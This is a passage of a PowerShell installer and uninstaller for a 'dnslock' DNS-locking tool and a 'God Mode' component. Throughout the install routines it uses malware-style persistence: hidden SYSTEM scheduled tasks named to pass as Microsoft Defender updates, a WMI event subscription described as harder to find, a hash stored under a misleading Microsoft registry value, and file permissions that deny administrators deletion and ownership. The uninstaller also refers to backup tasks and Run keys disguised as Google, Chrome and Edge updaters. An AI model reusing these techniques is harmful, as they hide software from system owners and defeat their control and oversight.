        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "ContainerInherit,ObjectInherit", "None", "Deny")))
        
        # Authenticated Users: ReadAndExecute
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")))
        
        Set-Acl -Path $InstallDir -AclObject $DirAcl

        # Explicitly harden each file (directory inheritance may not cover existing files perfectly)
        Get-ChildItem -Path $InstallDir -File | ForEach-Object {
            $FileAcl = Get-Acl -Path $_.FullName
            $FileAcl.SetAccessRuleProtection($true, $false)
            $FileAcl.Access | ForEach-Object { $FileAcl.RemoveAccessRule($_) | Out-Null }
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "None", "None", "Allow")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "None", "None", "Allow")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "Delete", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "None", "None", "Allow")))
            Set-Acl -Path $_.FullName -AclObject $FileAcl
        }
        
        Write-Log -Message "Installation directory and files locked. Owner=SYSTEM, Admins=ReadOnly+NoDelete." -Type "SUCCESS" -Color Green
    } catch {
        Write-Log -Message "Failed to harden NTFS permissions: $_" -Type "ERROR" -Color Red
    }
    # ----------------------------------------
    
    # 2. Build the Global CLI Command (dnslock) in C:\Windows (ASCII encoding, no BOM)
    Out-File -FilePath $CmdPath -InputObject $CmdBatContent -Encoding ASCII -Force
    if (-not (Test-Path $CmdPath)) {
        Write-Log -Message "CRITICAL: Wrapper file was not created at $CmdPath!" -Type "ERROR" -Color Red
    } else {
        Write-Log -Message "Global CLI wrapper created at $CmdPath." -Type "SUCCESS" -Color Green
    }

    # 2.2 Add InstallDir to system PATH so dnslock is discoverable from any shell
    Write-Log -Message "Adding $InstallDir to system PATH..." -Type "INFO" -Color Yellow
    try {
        $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
        if ($CurrentPath -notlike "*$InstallDir*") {
            $NewPath = $CurrentPath + ";" + $InstallDir
            [Environment]::SetEnvironmentVariable("PATH", $NewPath, "Machine")
            Write-Log -Message "Added $InstallDir to system PATH." -Type "SUCCESS" -Color Green
        } else {
            Write-Log -Message "$InstallDir already in system PATH." -Type "INFO" -Color Gray
        }
    } catch {
        Write-Log -Message "Failed to update system PATH: $_" -Type "ERROR" -Color Red
    }

    # 2.3 Harden the wrapper files against tampering (but allow all users to execute them)
    Write-Log -Message "Hardening dnslock wrapper files..." -Type "INFO" -Color Yellow
    $SidUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
    foreach ($WrapperPath in @($CmdPath, $CmdPathLocal)) {
        if (Test-Path $WrapperPath) {
            try {
                $CmdAcl = Get-Acl -Path $WrapperPath
                $CmdAcl.SetOwner($SidSystem)
                $CmdAcl.SetAccessRuleProtection($true, $false)
                $CmdAcl.Access | ForEach-Object { $CmdAcl.RemoveAccessRule($_) | Out-Null }
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "None", "None", "Allow")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "None", "None", "Allow")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "Delete", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "None", "None", "Allow")))
                Set-Acl -Path $WrapperPath -AclObject $CmdAcl
            } catch {
                Write-Log -Message "Failed to harden wrapper ACLs for $WrapperPath`: $_" -Type "ERROR" -Color Red
            }
        }
    }
    Write-Log -Message "Wrapper files locked to SYSTEM (FullControl), Admins (ReadOnly+NoDelete), Users (ReadAndExecute)." -Type "SUCCESS" -Color Green

    Write-Log -Message "Registering self-healing background tasks..." -Type "INFO" -Color Yellow
    
    # 3. Triggers: Run at System Startup, User Logon, and Event ID 10000 (Network Connected)
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallScript`" -SilentLock"
    $Trigger1 = New-ScheduledTaskTrigger -AtStartup
    $Trigger2 = New-ScheduledTaskTrigger -AtLogOn
    
    $CimClass = Get-CimClass -ClassName MSFT_TaskEventTrigger -Namespace "Root/Microsoft/Windows/TaskScheduler"
    $Trigger3 = New-CimInstance -CimClass $CimClass -ClientOnly
    $Trigger3.Subscription = "<QueryList><Query Id='0' Path='Microsoft-Windows-NetworkProfile/Operational'><Select Path='Microsoft-Windows-NetworkProfile/Operational'>*[System[EventID=10000]]</Select></Query></QueryList>"
    $Trigger3.Enabled = $True

    $PrincipalSettings = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($Trigger1, $Trigger2, $Trigger3) -Principal $PrincipalSettings -Force | Out-Null
    Write-Log -Message "Registered Scheduled Task: System will auto-heal locks on Reboot & Network Change." -Type "INFO" -Color Gray

    # 4. Guardian 1: Monitors every 5 minutes and restores if tampered
    $GuardianTaskName = "Windows-Defender-Platform-Update"
    $GuardianAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallScript`" -SilentLock"
    $GuardianTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
    $GuardianPrincipal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $GuardianTaskName -Action $GuardianAction -Trigger $GuardianTrigger -Principal $GuardianPrincipal -Force | Out-Null
    Write-Log -Message "Guardian 1 '$GuardianTaskName' registered (5-minute heartbeat)." -Type "INFO" -Color Gray

    # 4.1 Guardian 2: Additional watcher with a 10-minute interval (attacker must kill both)
    $Guardian2Name = "Windows-Defender-AM-Updates"
    $Guardian2Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallScript`" -SilentLock"
    $Guardian2Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration (New-TimeSpan -Days 9999)
    $Guardian2Principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $Guardian2Name -Action $Guardian2Action -Trigger $Guardian2Trigger -Principal $Guardian2Principal -Force | Out-Null
    Write-Log -Message "Guardian 2 '$Guardian2Name' registered (10-minute heartbeat)." -Type "INFO" -Color Gray

    # 4.2 WMI Event Subscription: Third hidden persistence layer (harder to find than tasks)
    Write-Log -Message "Registering WMI event subscription for persistence..." -Type "INFO" -Color Gray
    try {
        $WmiQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_Service' AND TargetInstance.Name = 'Schedule'"
        $WmiConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="WindowsUpdateHealthCheck"; CommandLineTemplate="powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallScript`" -SilentLock"; RunInteractively=$false} -ErrorAction Stop
        $WmiFilter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name="WindowsUpdateHealthCheck"; EventNamespace="root\cimv2"; QueryLanguage="WQL"; Query=$WmiQuery} -ErrorAction Stop
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WmiFilter; Consumer=$WmiConsumer} -ErrorAction Stop | Out-Null
        Write-Log -Message "WMI subscription registered (triggers if Schedule service is modified)." -Type "SUCCESS" -Color Green
    } catch {
        Write-Log -Message "WMI subscription registration failed: $_" -Type "WARN" -Color Yellow
    }

    # 5. Self-Integrity: Store SHA256 hash in a misleading registry key (harder to tamper than a file)
    $IntegrityRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
    if (-not (Test-Path $IntegrityRegPath)) { New-Item -Path $IntegrityRegPath -Force | Out-Null }
    Set-ItemProperty -Path $IntegrityRegPath -Name "PushConfigBackoffInterval" -Value $ScriptHash -Force -ErrorAction SilentlyContinue
    Write-Log -Message "Self-integrity hash stored in registry (backup file already written)." -Type "INFO" -Color Gray

    Enable-DNSLock
    Write-Log -Message "INSTALLATION COMPLETE! System is permanently protected." -Type "SUCCESS" -Color Green

    # 6. GPO registry values are protection enough; skip ACL hardening to avoid gpupdate lock conflicts
    Write-Log -Message "GPO registry values enforced. Skipping ACL hardening to avoid gpupdate lock." -Type "INFO" -Color Gray

    # Final status verification
    $FailedCount = 0
    if (-not (Test-Path $InstallDir)) { $FailedCount++; Write-Log -Message "Install directory $InstallDir missing." -Type "ERROR" -Color Red }
    if (-not (Test-Path $InstallScript)) { $FailedCount++; Write-Log -Message "Install script $InstallScript missing." -Type "ERROR" -Color Red }
    if (-not (Test-Path $CmdPath)) { $FailedCount++; Write-Log -Message "Global CLI wrapper $CmdPath missing." -Type "ERROR" -Color Red }
    if (-not (Test-Path $IntegrityFile)) { $FailedCount++; Write-Log -Message "Integrity file $IntegrityFile missing." -Type "ERROR" -Color Red }
    if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Main task $TaskName missing." -Type "ERROR" -Color Red }
    if (-not (Get-ScheduledTask -TaskName $GuardianTaskName -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Guardian 1 $GuardianTaskName missing." -Type "ERROR" -Color Red }
    if (-not (Get-ScheduledTask -TaskName $Guardian2Name -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Guardian 2 $Guardian2Name missing." -Type "ERROR" -Color Red }
    $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
    if ($CurrentPath -notlike "*$InstallDir*") { $FailedCount++; Write-Log -Message "System PATH does not contain $InstallDir." -Type "ERROR" -Color Red }
    $WmiFilter = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue
    if (-not $WmiFilter) { Write-Log -Message "WMI event filter missing." -Type "WARN" -Color Yellow }
    $WmiConsumer = Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue
    if (-not $WmiConsumer) { Write-Log -Message "WMI event consumer missing." -Type "WARN" -Color Yellow }
    if ($FailedCount -eq 0) {
        Write-Host "[SUCCESS] INSTALLATION COMPLETE!" -ForegroundColor Green
    } else {
        Write-Host "[PARTIAL] INSTALLATION COMPLETE WITH ERRORS! ($FailedCount items missing)" -ForegroundColor Yellow
    }
}

function Invoke-AsSystem {
    param([string]$Command)
    $TempTaskName = "DNSGuard-Uninstall-Helper"
    $CommonTemp = "C:\Windows\Temp"
    $ResultFile = "$CommonTemp\DNSGuard_CleanupResult.txt"
    $TempScript = "$CommonTemp\DNSGuard_Cleanup.ps1"
    Write-Log -Message "[DEBUG] Invoke-AsSystem called. CommonTemp=$CommonTemp" -Type "INFO" -Color Yellow
    try {
        # Ensure SYSTEM can write to the common temp directory
        $TempAcl = Get-Acl -Path $CommonTemp
        $SystemSid = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-18")
        $TempAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SystemSid, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
        Set-Acl -Path $CommonTemp -AclObject $TempAcl -ErrorAction SilentlyContinue
        # Write the cleanup command to a temporary script file with error capture
        $ScriptContent = "try { `$ErrorActionPreference = 'Stop'; $Command; 'SUCCESS' | Out-File -FilePath '$ResultFile' -Encoding UTF8 -Force } catch { `$_.Exception.Message | Out-File -FilePath '$ResultFile' -Encoding UTF8 -Force }"
        $ScriptContent | Out-File -FilePath $TempScript -Encoding UTF8 -Force
        Write-Log -Message "[DEBUG] Temp script written to $TempScript" -Type "INFO" -Color Yellow
        # Use full PowerShell path and execute the temp script
        $Action = New-ScheduledTaskAction -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$TempScript`""
        $Principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $TempTaskName -Action $Action -Principal $Principal -Force | Out-Null
        Start-ScheduledTask -TaskName $TempTaskName
        Write-Log -Message "[DEBUG] SYSTEM task started. Waiting for completion..." -Type "INFO" -Color Yellow
        # Wait up to 30 seconds, checking every 2 seconds if the task is still registered
        $MaxWait = 30
        $Waited = 0
        while ($Waited -lt $MaxWait) {
            Start-Sleep -Seconds 2
            $Waited += 2
            $Task = Get-ScheduledTask -TaskName $TempTaskName -ErrorAction SilentlyContinue
            if (-not $Task) { break }
        }
        Unregister-ScheduledTask -TaskName $TempTaskName -Confirm:$false | Out-Null
        Write-Log -Message "[DEBUG] SYSTEM task completed and unregistered." -Type "INFO" -Color Yellow
        # Read and display the result
        if (Test-Path $ResultFile) {
            $Result = Get-Content -Path $ResultFile -Raw
            Write-Log -Message "[DEBUG] SYSTEM task result: $Result" -Type "INFO" -Color Yellow
            Remove-Item -Path $ResultFile -Force -ErrorAction SilentlyContinue
        } else {
            Write-Log -Message "[DEBUG] No result file found at $ResultFile" -Type "ERROR" -Color Red
        }
        # Clean up the temp script
        Remove-Item -Path $TempScript -Force -ErrorAction SilentlyContinue
    } catch {
        Write-Log -Message "SYSTEM helper task failed: $_" -Type "ERROR" -Color Red
    }
}

function Install-GodModePersistence {
    Write-Log -Message "Installing God Mode to System ($GodModeInstallDir)..." -Type "ACTION" -Color Yellow

    # Gate: prevent overwrite
    if (Test-Path $GodModeInstallDir) {
        Write-Log -Message "Installation aborted: $GodModeInstallDir already exists." -Type "ERROR" -Color Red
        Write-Host "[ERROR] God Mode is already installed. Uninstall first." -ForegroundColor Red
        return
    }
    if (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue) {
        Write-Log -Message "Installation aborted: Scheduled task '$GodModeTaskName' already exists." -Type "ERROR" -Color Red
        Write-Host "[ERROR] God Mode is already installed. Uninstall first." -ForegroundColor Red
        return
    }

    # 1. Secure copy
    if (-not (Test-Path $GodModeInstallDir)) { New-Item -ItemType Directory -Path $GodModeInstallDir -Force | Out-Null }
    Copy-Item -Path $PSCommandPath -Destination $GodModeInstallScript -Force
    Write-Log -Message "Payload copied to $GodModeInstallScript." -Type "INFO" -Color Gray

    # 2. Build wrapper
    $WrapperContent = "@echo off`r`nC:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" %*"
    $WrapperLocal = Join-Path $GodModeInstallDir "godmode.cmd"
    Out-File -FilePath $WrapperLocal -InputObject $WrapperContent -Encoding ASCII -Force
    Write-Log -Message "Local wrapper created at $WrapperLocal." -Type "INFO" -Color Gray

    # 3. Integrity hash
    $ScriptHash = (Get-FileHash -Path $GodModeInstallScript -Algorithm SHA256).Hash
    $GodModeIntegrityFile = Join-Path $GodModeInstallDir "integrity.sha256"
    Set-Content -Path $GodModeIntegrityFile -Value $ScriptHash -Encoding UTF8 -Force
    Write-Log -Message "Self-integrity hash written." -Type "INFO" -Color Gray

    # 4. NTFS hardening
    Write-Log -Message "Hardening NTFS on God Mode directory..." -Type "INFO" -Color Yellow
    try {
        $SidUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
        $DirAcl = Get-Acl -Path $GodModeInstallDir
        $DirAcl.SetOwner($SidSystem)
        Set-Acl -Path $GodModeInstallDir -AclObject $DirAcl
        Get-ChildItem -Path $GodModeInstallDir -File | ForEach-Object {
            $FileAcl = Get-Acl -Path $_.FullName
            $FileAcl.SetOwner($SidSystem)
            Set-Acl -Path $_.FullName -AclObject $FileAcl
        }
        $DirAcl = Get-Acl -Path $GodModeInstallDir
        $DirAcl.SetAccessRuleProtection($true, $false)
        $DirAcl.Access | ForEach-Object { $DirAcl.RemoveAccessRule($_) | Out-Null }
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "DeleteSubdirectoriesAndFiles", "ContainerInherit,ObjectInherit", "None", "Deny")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "ContainerInherit,ObjectInherit", "None", "Deny")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "ContainerInherit,ObjectInherit", "None", "Deny")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")))
        Set-Acl -Path $GodModeInstallDir -AclObject $DirAcl
        Get-ChildItem -Path $GodModeInstallDir -File | ForEach-Object {
            $FileAcl = Get-Acl -Path $_.FullName
            $FileAcl.SetAccessRuleProtection($true, $false)
            $FileAcl.Access | ForEach-Object { $FileAcl.RemoveAccessRule($_) | Out-Null }
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "None", "None", "Allow")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "None", "None", "Allow")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "Delete", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "None", "None", "Allow")))
            Set-Acl -Path $_.FullName -AclObject $FileAcl
        }
        Write-Log -Message "God Mode directory and files locked. Owner=SYSTEM, Admins=ReadOnly+NoDelete." -Type "SUCCESS" -Color Green
    } catch {
        Write-Log -Message "Failed to harden NTFS: $_" -Type "ERROR" -Color Red
    }

    # 5. Global CLI
    Out-File -FilePath $GodModeCmdPath -InputObject $WrapperContent -Encoding ASCII -Force
    if (-not (Test-Path $GodModeCmdPath)) {
        Write-Log -Message "CRITICAL: godmode wrapper not created at $GodModeCmdPath!" -Type "ERROR" -Color Red
    } else {
        Write-Log -Message "Global CLI wrapper created at $GodModeCmdPath." -Type "SUCCESS" -Color Green
    }

    # 6. PATH
    try {
        $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
        if ($CurrentPath -notlike "*$GodModeInstallDir*") {
            $NewPath = $CurrentPath + ";" + $GodModeInstallDir
            [Environment]::SetEnvironmentVariable("PATH", $NewPath, "Machine")
            Write-Log -Message "Added $GodModeInstallDir to system PATH." -Type "SUCCESS" -Color Green
        } else {
            Write-Log -Message "$GodModeInstallDir already in PATH." -Type "INFO" -Color Gray
        }
    } catch {
        Write-Log -Message "Failed to update PATH: $_" -Type "ERROR" -Color Red
    }

    # 7. Harden wrapper
    $SidUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
    foreach ($WrapperPath in @($GodModeCmdPath, $WrapperLocal)) {
        if (Test-Path $WrapperPath) {
            try {
                $CmdAcl = Get-Acl -Path $WrapperPath
                $CmdAcl.SetOwner($SidSystem)
                $CmdAcl.SetAccessRuleProtection($true, $false)
                $CmdAcl.Access | ForEach-Object { $CmdAcl.RemoveAccessRule($_) | Out-Null }
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "None", "None", "Allow")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "None", "None", "Allow")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "Delete", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "None", "None", "Allow")))
                Set-Acl -Path $WrapperPath -AclObject $CmdAcl
            } catch {
                Write-Log -Message "Failed to harden wrapper ACLs for $WrapperPath`: $_" -Type "ERROR" -Color Red
            }
        }
    }
    Write-Log -Message "Wrapper files locked." -Type "SUCCESS" -Color Green

    # 8. Main task: auto-enable God Mode at logon if flag exists
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
    $Trigger1 = New-ScheduledTaskTrigger -AtStartup
    $Trigger2 = New-ScheduledTaskTrigger -AtLogOn
    $PrincipalSettings = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $GodModeTaskName -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $PrincipalSettings -Force | Out-Null
    Write-Log -Message "Main God Mode task registered." -Type "INFO" -Color Gray

    # 9. Guardian: re-apply every 5 minutes if flag exists
    $GuardianAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
    $GuardianTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
    $GuardianPrincipal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $GodModeGuardianName -Action $GuardianAction -Trigger $GuardianTrigger -Principal $GuardianPrincipal -Force | Out-Null
    Write-Log -Message "God Mode guardian registered (5-min heartbeat)." -Type "INFO" -Color Gray

    # 10. Integrity in registry (misleading key)
    $GodModeIntegrityRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
    if (-not (Test-Path $GodModeIntegrityRegPath)) { New-Item -Path $GodModeIntegrityRegPath -Force | Out-Null }
    Set-ItemProperty -Path $GodModeIntegrityRegPath -Name "PushConfigBackoffInterval" -Value $ScriptHash -Force -ErrorAction SilentlyContinue
    Write-Log -Message "Integrity hash stored in registry." -Type "INFO" -Color Gray

    Write-Log -Message "GOD MODE INSTALLATION COMPLETE!" -Type "SUCCESS" -Color Green

    # Final verification
    $FailedCount = 0
    if (-not (Test-Path $GodModeInstallDir)) { $FailedCount++; Write-Log -Message "Install dir missing." -Type "ERROR" -Color Red }
    if (-not (Test-Path $GodModeInstallScript)) { $FailedCount++; Write-Log -Message "Install script missing." -Type "ERROR" -Color Red }
    if (-not (Test-Path $GodModeCmdPath)) { $FailedCount++; Write-Log -Message "Global CLI missing." -Type "ERROR" -Color Red }
    if (-not (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Main task missing." -Type "ERROR" -Color Red }
    if (-not (Get-ScheduledTask -TaskName $GodModeGuardianName -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Guardian missing." -Type "ERROR" -Color Red }
    $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
    if ($CurrentPath -notlike "*$GodModeInstallDir*") { $FailedCount++; Write-Log -Message "PATH missing." -Type "ERROR" -Color Red }
    if ($FailedCount -eq 0) {
        Write-Host "[SUCCESS] GOD MODE INSTALLATION COMPLETE!" -ForegroundColor Green
    } else {
        Write-Host "[PARTIAL] INSTALLATION COMPLETE WITH ERRORS! ($FailedCount items missing)" -ForegroundColor Yellow
    }
}

function Uninstall-GodModePersistence {
    $IsInstalled = (Test-Path $GodModeInstallDir) -or (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue)
    if (-not $IsInstalled) {
        Write-Host "[WARN] God Mode is not installed. Nothing to uninstall." -ForegroundColor Yellow
        return
    }

    Write-Log -Message "Uninstalling God Mode from System..." -Type "ACTION" -Color Yellow
    Disable-GodMode

    # Remove tasks
    if (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $GodModeTaskName -Confirm:$false | Out-Null
        Write-Log -Message "Removed main task $GodModeTaskName." -Type "INFO" -Color Gray
    }
    if (Get-ScheduledTask -TaskName $GodModeGuardianName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $GodModeGuardianName -Confirm:$false | Out-Null
        Write-Log -Message "Removed guardian $GodModeGuardianName." -Type "INFO" -Color Gray
    }

    # Remove backup tasks
    $BackupPrefixes = @("GoogleUpdateTask_", "ChromeUpdater_", "OneDriveSyncTask_", $GodModeTaskPrefix)
    foreach ($Prefix in $BackupPrefixes) {
        try {
            Get-ScheduledTask -TaskName "$Prefix*" -ErrorAction SilentlyContinue |
                Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
        } catch { }
    }

    # Remove registry persistence
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdateCore" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "MicrosoftEdgeUpdateCore" -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Failed to remove registry persistence: $_" -Type "WARN" -Color Yellow }

    # Remove global CLI
    if (Test-Path $GodModeCmdPath) {
        try {
            $CmdAcl = Get-Acl -Path $GodModeCmdPath
            $CurrentUserSid = [Security.Principal.WindowsIdentity]::GetCurrent().User
            $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($CurrentUserSid, "FullControl", "None", "None", "Allow")))
            Set-Acl -Path $GodModeCmdPath -AclObject $CmdAcl -ErrorAction Stop
            Remove-Item -Path $GodModeCmdPath -Force -ErrorAction Stop
        } catch {
            Invoke-AsSystem -Command "takeown.exe /F $GodModeCmdPath; icacls.exe $GodModeCmdPath /reset; Remove-Item -Path $GodModeCmdPath -Force -ErrorAction Stop"
        }
        if (Test-Path $GodModeCmdPath) {
            Write-Log -Message "Failed to remove godmode CLI." -Type "ERROR" -Color Red
        } else {
            Write-Log -Message "Removed godmode CLI." -Type "INFO" -Color Gray
        }
    }

    # Remove PATH entry
    try {
        $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
        if ($CurrentPath -like "*$GodModeInstallDir*") {
            $NewPath = ($CurrentPath -split ';' | Where-Object { $_ -ne $GodModeInstallDir }) -join ';'
            [Environment]::SetEnvironmentVariable("PATH", $NewPath, "Machine")
            Write-Log -Message "Removed $GodModeInstallDir from PATH." -Type "INFO" -Color Gray
        }
    } catch { Write-Log -Message "Failed to clean PATH: $_" -Type "ERROR" -Color Red }

    # Remove install dir
    if (Test-Path $GodModeInstallDir) {
        try {
            Remove-Item -Path $GodModeInstallDir -Recurse -Force -ErrorAction Stop
        } catch {
            Invoke-AsSystem -Command "takeown.exe /F $GodModeInstallDir /R /D Y; icacls.exe $GodModeInstallDir /reset /T; Remove-Item -Path $GodModeInstallDir -Recurse -Force -ErrorAction Stop"
            Start-Sleep -Seconds 3
        }
        if (Test-Path $GodModeInstallDir) {
            Write-Log -Message "SYSTEM cleanup failed: $GodModeInstallDir still exists." -Type "ERROR" -Color Red
        } else {
            Write-Log -Message "God Mode directory removed." -Type "INFO" -Color Gray
        }
    }

    # Final verification
    $FailedCount = 0
    if (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Task $GodModeTaskName still exists." -Type "ERROR" -Color Red }
